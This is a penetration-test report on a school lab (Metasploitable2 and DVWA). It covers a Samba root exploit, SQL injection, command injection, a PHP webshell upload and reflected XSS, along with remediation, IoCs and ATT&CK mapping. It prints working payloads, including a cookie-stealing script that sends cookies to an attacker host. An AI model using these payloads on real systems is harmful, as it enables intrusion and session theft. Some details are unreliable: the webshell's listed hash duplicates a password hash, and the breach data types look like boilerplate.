# Security Audit Report - M1BLUR

## Document Control
| Field | Value |
|-------|-------|
| **Client** | École IT Bruxelles |
| **Audit Date** | 25 March 2026 |
| **Author** | Laurent Zang |
| **Classification** | Confidential |

## 1. Executive Summary
A comprehensive security audit was conducted on the M1BLUR laboratory environment (Metasploitable2 and DVWA). The assessment identified multiple critical vulnerabilities including an unpatched Samba vulnerability (CVE-2007-2447) allowing remote root access, SQL injection exposing all user credentials, reflected XSS enabling session hijacking, command injection, and unrestricted file upload leading to webshell deployment. All findings were successfully exploited, demonstrating a complete compromise of both targets. Immediate remediation is required.

### Scope
- **Targets**: Metasploitable2 (172.22.0.20), DVWA (172.22.0.30)
- **Duration**: 5 days
- **Methodology**: Black box / Grey box

### Critical Findings Summary
| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 2 |
| Medium | 1 |
| Low | 0 |

### Overall Risk Level
**CRITICAL** - Full system compromise achieved on both targets.

## 2. Timeline of Activities
| Time | Activity | Tool | Result |
|------|----------|------|--------|
| Day 1 | Network scanning | Nmap | 23 open ports on Metasploitable |
| Day 1 | Service enumeration | enum4linux | SMB shares, users identified |
| Day 1 | Vulnerability research | Exploit-DB | CVE-2007-2447, CVE-2011-2523 identified |
| Day 2 | Samba exploit | Metasploit | Root access on Metasploitable |
| Day 2 | Hash extraction | cat /etc/shadow | msfadmin, user, postgres hashes |
| Day 2 | Hash cracking | John the Ripper | msfadmin:msfadmin, user:user |
| Day 3 | SQL Injection | SQLMap | Full user database extracted |
| Day 3 | XSS Reflected | Manual | Cookie theft successful |
| Day 3 | Command Injection | Manual | www-data access |
| Day 3 | File Upload | Manual | Webshell deployed |
| Day 4 | Log analysis | Docker logs | IoCs identified |

## 3. Detailed Findings

### Finding 1: Samba Usermap Script Command Execution (CVE-2007-2447)
- **CVE**: CVE-2007-2447
- **CVSS Score**: 10.0 (Critical)
- **Affected Asset**: Metasploitable2 (172.22.0.20)
- **Affected Service/Port**: Samba (139, 445)
- **Software Version**: Samba 3.0.20-Debian

#### Description
The Samba "username map script" functionality allows remote attackers to execute arbitrary commands as root by sending a specially crafted username string.

#### Proof of Concept
```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.22.0.20
msf6 exploit(multi/samba/usermap_script) > set LHOST 172.22.0.1
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
msf6 exploit(multi/samba/usermap_script) > run

[*] Command shell session opened
whoami
root
id
uid=0(root) gid=0(root)
Impact

Complete system compromise with root privileges. Attacker can install backdoors, exfiltrate data, and pivot to internal networks.
Remediation
bash

# Update Samba to version 3.6.25 or later
# Or apply vendor patch
# If not required, disable SMBv1 and restrict access

References

    https://www.exploit-db.com/exploits/16320

    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447

Finding 2: SQL Injection (DVWA)

    OWASP Category: A03:2021 - Injection

    CVSS Score: 9.8 (Critical)

    Affected Asset: DVWA (172.22.0.30)

    Affected Service/Port: HTTP (80)

    Software Version: DVWA v1.10

Description

The SQL injection vulnerability in the "SQL Injection" page allows an attacker to execute arbitrary SQL queries and extract sensitive data from the database.
Proof of Concept
sql

# Extract all users and passwords
1' UNION SELECT user, password FROM users #

# Results
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99

Impact

Full database compromise. User credentials exposed. Password cracking revealed weak passwords (password, abc123, letmein, charley).
Remediation
php

// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();

Finding 3: Command Injection (DVWA)

    OWASP Category: A03:2021 - Injection

    CVSS Score: 9.8 (Critical)

    Affected Asset: DVWA (172.22.0.30)

    Affected Service/Port: HTTP (80)

Description

The ping functionality uses user input directly in system commands without sanitization, allowing arbitrary command execution.
Proof of Concept
bash

# In the Command Injection page
127.0.0.1; whoami

# Result shows www-data
www-data

Impact

Remote code execution as www-data. Attacker can execute any system command, potentially leading to full server compromise.
Remediation
php

// Use escapeshellcmd() or avoid system calls
$ip = escapeshellcmd($_POST['ip']);
$output = shell_exec("ping -c 4 " . $ip);

Finding 4: Unrestricted File Upload (DVWA)

    OWASP Category: A04:2021 - Insecure Design

    CVSS Score: 9.8 (Critical)

    Affected Asset: DVWA (172.22.0.30)

    Affected Service/Port: HTTP (80)

Description

The file upload functionality allows uploading of arbitrary files without validation, enabling webshell deployment.
Proof of Concept
php

# webshell.php
<?php system($_GET["cmd"]); ?>

# Uploaded successfully
../../hackable/uploads/shell.php succesfully uploaded!

# Access webshell
http://172.22.0.30/hackable/uploads/shell.php?cmd=whoami
Result: www-data

Impact

Remote code execution via webshell. Attacker can execute commands, upload more malware, or pivot to other systems.
Remediation

    Implement file extension whitelist (.jpg, .png, .gif)

    Validate file content (not just MIME type)

    Store uploaded files outside webroot

    Disable PHP execution in upload directories

    Rename uploaded files to random names

Finding 5: Reflected Cross-Site Scripting (XSS) (DVWA)

    OWASP Category: A03:2021 - Injection

    CVSS Score: 6.1 (Medium)

    Affected Asset: DVWA (172.22.0.30)

    Affected Service/Port: HTTP (80)

Description

The reflected XSS vulnerability allows injection of malicious JavaScript that executes in victims' browsers.
Proof of Concept
html

<script>alert('XSS')</script>

Cookie Stealer Payload
html

<script>document.location='http://172.22.0.1:8080/?cookie='+document.cookie</script>

Impact

Session hijacking, credential theft, defacement, or malware distribution.
Remediation
php

// Use htmlspecialchars() for output
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

4. Compromised Assets
Asset	IP	Service	Data Exposed	Sensitivity
Metasploitable	172.22.0.20	Samba	Full system compromise	Critical
Metasploitable	172.22.0.20	System	/etc/shadow (password hashes)	Critical
DVWA	172.22.0.30	MySQL	User database (5 users)	High
DVWA	172.22.0.30	HTTP	Session cookies	Medium
5. Data Breach Assessment
Data Types Compromised

    Personally Identifiable Information (PII)

    Authentication credentials (passwords)

    Financial data

    Intellectual property

    System configuration

    Source code

Estimated Records Affected

    Number of users: 5

    Number of records: 5

GDPR Compliance

    Personal data compromised?: Yes

    Breach notification required?: Yes (within 72h)

    APD notification: Required

    Data subjects notification: Required (if risk is high)

6. Indicators of Compromise (IoCs)
Network IoCs
yaml

attacker_ips:
  - 172.22.0.1 (Kali Linux)

target_ips:
  - 172.22.0.20 (Metasploitable)
  - 172.22.0.30 (DVWA)

suspicious_urls:
  - http://172.22.0.30/hackable/uploads/shell.php?cmd=whoami
  - http://172.22.0.30/hackable/uploads/shell.php?cmd=ls%20-la
  - /vulnerabilities/exec/ (POST requests with ; whoami)
  - /vulnerabilities/sqli/?id= with UNION SELECT
  - /vulnerabilities/xss_r/?name=<script>

File IoCs
yaml

files_dropped:
  - path: /var/www/html/hackable/uploads/shell.php
    hash: 5f4dcc3b5aa765d61d8327deb882cf99
    content: <?php system($_GET["cmd"]); ?>

evidence_files:
  - path: /tmp/preuves_j2/shadow.txt
  - path: /tmp/preuves_j2/hashes.txt

Log Signatures
text

# XSS Attack
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(...)

# SQL Injection
GET /vulnerabilities/sqli/?id=1%27%20UNION%20SELECT...

# Command Injection
POST /vulnerabilities/exec/ HTTP/1.1
ip=127.0.0.1%3B%20whoami

# Webshell Access
GET /hackable/uploads/shell.php?cmd=whoami

7. MITRE ATT&CK Mapping
Tactic	Technique	ID	Observed
Reconnaissance	Active Scanning	T1595	✅ Nmap scan
Initial Access	Exploit Public-Facing App	T1190	✅ Samba, SQLi, XSS
Execution	Command and Scripting	T1059	✅ Reverse shell, webshell
Persistence	Web Shell	T1505	✅ shell.php uploaded
Privilege Escalation	Exploit Privilege Escalation	T1068	✅ Root via Samba
Credential Access	OS Credential Dumping	T1003	✅ /etc/shadow dump
Credential Access	Brute Force	T1110	✅ Hash cracking
Discovery	System Information Discovery	T1082	✅ whoami, uname, ls
Collection	Data from Local System	T1005	✅ /etc/shadow, /etc/passwd
Exfiltration	Exfiltration Over C2 Channel	T1041	✅ XSS cookie theft
8. Risk Assessment
Business Impact
Scenario	Likelihood	Impact	Risk Level
Data breach	High	Critical	Critical
Service disruption	Medium	High	High
Reputation damage	High	Medium	High
Technical Impact

    Confidentiality: Critical (root access, user credentials exposed)

    Integrity: High (files could be modified)

    Availability: Low (services remained operational)

9. Recommendations
Priority 1 - Critical (24h)
#	Recommendation	Affected Asset	Responsible
1	Patch Samba (CVE-2007-2447) or disable if not needed	Metasploitable	IT Team
2	Remove webshell /var/www/html/hackable/uploads/shell.php	DVWA	IT Team
3	Disable PHP execution in uploads directory	DVWA	IT Team
4	Reset all DVWA user passwords	DVWA	IT Team
5	Implement SQL injection protection (prepared statements)	DVWA	Dev Team
Priority 2 - High (1 week)
#	Recommendation	Affected Asset	Responsible
1	Implement input validation for all user inputs	Both	Dev Team
2	Deploy Web Application Firewall (WAF)	Web apps	Security Team
3	Implement file upload whitelist and content validation	DVWA	Dev Team
4	Configure proper logging and monitoring	Both	IT Team
5	Disable unnecessary services (SMBv1, etc.)	Metasploitable	IT Team
Priority 3 - Medium (1 month)
#	Recommendation	Affected Asset	Responsible
1	Regular security training for developers	All	Management
2	Schedule quarterly penetration tests	All	Security Team
3	Implement patch management process	All	IT Team
4	Deploy SIEM for centralized log analysis	Network	Security Team
5	Implement network segmentation	Network	IT Team
10. Remediation Plan
Phase 1: Immediate Actions (Day 1)

    Disable Samba service if not required

    Remove webshell and restrict upload directory

    Change all compromised passwords

    Block attacker IP (172.22.0.1) on firewall

Phase 2: Short-term (Week 1)

    Apply security patches to Samba

    Implement input validation and prepared statements

    Configure WAF rules for SQLi and XSS

    Enable comprehensive logging

Phase 3: Long-term (Month 1)

    Security policy updates

    Regular vulnerability scanning

    Employee security training

    Incident response plan development

11. Conclusion

The M1BLUR laboratory environment contains critical security vulnerabilities that allowed complete compromise of both targets. Immediate remediation is required for the Samba vulnerability (CVE-2007-2447) and DVWA web application flaws. With proper input validation, secure coding practices, and network segmentation, the risk can be significantly reduced.
12. Appendices
Appendix A: Scan Results

    [nmap-full.txt]

    [gobuster-results.txt]

    [enum4linux-output.txt]

Appendix B: Exploitation Logs

    [metasploit-session.log]

    [sqlmap-output.log]

    [extracted-data.txt]

Appendix C: IoCs

    [iocs.txt]

    [hashes.txt]

    [yara-rules.yar]

Appendix D: Logs

    [dvwa_access_logs.txt]

    [samba-log.txt]

    [auth.log]

Appendix E: Tools Used

    Nmap 7.94

    Metasploit 6.3

    SQLMap 1.7

    John the Ripper

    Gobuster

    Hydra

    Docker

Report generated by: Laurent Zang
Date: 25 March 2026

